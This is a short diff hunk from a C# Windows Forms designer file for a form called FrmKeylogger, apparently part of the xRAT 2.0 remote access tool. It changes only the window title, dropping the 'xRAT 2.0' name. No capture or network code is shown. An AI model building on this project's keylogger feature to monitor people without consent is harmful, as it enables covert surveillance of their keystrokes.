@@ -103,7 +103,7 @@
             this.MinimumSize = new System.Drawing.Size(630, 465);
             this.Name = "FrmKeylogger";
             this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
-            this.Text = "xRAT 2.0 - Keylogger []";
+            this.Text = "Keylogger []";
             this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.FrmKeylogger_FormClosing);
             this.Load += new System.EventHandler(this.FrmKeylogger_Load);
             this.ResumeLayout(false);
